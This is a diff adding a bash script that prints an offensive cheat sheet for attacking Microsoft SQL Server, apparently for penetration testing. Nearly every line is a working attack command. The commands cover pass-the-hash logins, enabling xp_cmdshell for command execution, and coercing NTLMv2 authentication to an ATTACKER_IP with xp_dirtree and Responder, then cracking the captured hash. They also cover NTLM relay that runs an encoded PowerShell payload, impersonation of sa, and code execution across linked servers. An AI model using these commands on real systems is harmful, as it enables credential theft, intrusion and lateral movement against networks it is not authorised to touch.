@@ -1,0 +1,81 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── MSSQL — ATTACKS & EXPLOITATION ───────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Connect ──────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}nxc mssql <TARGET> -u sa -p <PASS>${NC}               # local auth"
+echo -e "  ${GREEN}nxc mssql <TARGET> -u <USER> -p <PASS> -d <DOMAIN>${NC}  # domain auth"
+echo -e "  ${GREEN}nxc mssql <TARGET> -u <USER> -H <HASH> --local-auth${NC}  # PTH"
+echo -e "  ${GREEN}mssqlclient.py <USER>:<PASS>@<TARGET> -windows-auth${NC}  # impacket"
+echo -e "  ${GREEN}mssqlclient.py Administrator@<TARGET> -hashes ':<NT_HASH>' -windows-auth${NC}"
+echo -e "  ${GREEN}mssqlclient.py <DOMAIN>/<USER>@<TARGET> -windows-auth${NC}"
+echo -e "  ${GREEN}sqsh -S <TARGET> -U sa -P <PASS>${NC}                 # sqsh client"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Command Execution ────────────────────────────────${NC}"
+echo -e "  ${GREEN}nxc mssql <TARGET> -u <USER> -p <PASS> -x 'whoami'${NC}  # nxc exec"
+printf "\n"
+echo -e "  Note: In mssqlclient.py:"
+echo -e "  ${GREEN}enable_xp_cmdshell${NC}                               # shortcut"
+echo -e "  ${GREEN}EXEC sp_configure 'show advanced options', 1; RECONFIGURE;${NC}"
+echo -e "  ${GREEN}EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;${NC}"
+echo -e "  ${GREEN}EXEC master.dbo.xp_cmdshell 'whoami';${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── UNC Injection (Capture NTLMv2) ───────────────────${NC}"
+echo -e "  ${GREEN}sudo responder -I tun0${NC}                           # Kali listener"
+printf "\n"
+echo -e "  Note: In SQL client:"
+echo -e "  ${GREEN}EXEC master..xp_dirtree '\\\\<ATTACKER_IP>\\test';${NC}"
+echo -e "  ${GREEN}hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── NTLM Relay via MSSQL ─────────────────────────────${NC}"
+echo -e "  ${GREEN}sudo impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c 'powershell -enc <B64>'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Impersonation ────────────────────────────────────${NC}"
+echo -e "  ${GREEN}EXECUTE AS LOGIN = 'sa';${NC}                         # impersonate sa"
+echo -e "  ${GREEN}SELECT SYSTEM_USER;${NC}                              # verify context"
+echo -e "  ${GREEN}REVERT;${NC}                                          # revert"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Linked Server Traversal ──────────────────────────${NC}"
+echo -e "  ${GREEN}EXEC sp_linkedservers;${NC}                           # list linked servers"
+echo -e "  ${GREEN}SELECT version FROM OPENQUERY(\"DC01\", 'SELECT @@version AS version');${NC}"
+echo -e "  ${GREEN}EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT DC01;${NC}"
+echo -e "  ${GREEN}EXEC master..xp_cmdshell 'whoami' AT DC01;${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── nxc MSSQL Modules ────────────────────────────────${NC}"
+echo -e "  ${GREEN}nxc mssql <TARGET> -u <USER> -p <PASS> -M mssql_priv${NC}        # check privileges"
+echo -e "  ${GREEN}nxc mssql <TARGET> -u <USER> -p <PASS> -M enum_links${NC}        # linked servers"
+echo -e "  ${GREEN}nxc mssql <TARGET> -u <USER> -p <PASS> -M exec_on_link${NC}      # exec on linked"
+echo -e "  ${GREEN}nxc mssql <TARGET> -u <USER> -p <PASS> -M link_enable_cmdshell${NC}  # enable cmdshell on link"
+echo -e "  ${GREEN}nxc mssql <TARGET> -u <USER> -p <PASS> -M mssql_coerce${NC}      # NTLM coercion"
+echo -e "  ${GREEN}nxc mssql <TARGET> -u <USER> -p <PASS> -M enum_impersonate${NC}  # impersonatable users"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── PowerUpSQL ───────────────────────────────────────${NC}"
+echo -e "  ${GREEN}Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft${NC}"
+echo -e "  ${GREEN}Invoke-SQLAudit -Verbose -Instance <TARGET>${NC}"
+echo -e "  ${GREEN}Invoke-SQLOSCmd -Instance <TARGET> -Command 'whoami' | select -ExpandProperty CommandResults${NC}"
+echo -e "  ${GREEN}Get-SqlServerLinkCrawl -Instance <TARGET> -Query 'EXEC xp_cmdshell \"whoami\"' | select instance,customquery | ft${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Useful SQL Queries ───────────────────────────────${NC}"
+echo -e "  ${GREEN}SELECT SYSTEM_USER;${NC}                              # current login"
+echo -e "  ${GREEN}SELECT IS_SRVROLEMEMBER('sysadmin');${NC}             # check sysadmin"
+echo -e "  ${GREEN}SELECT name FROM master.dbo.sysdatabases;${NC}        # list DBs"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
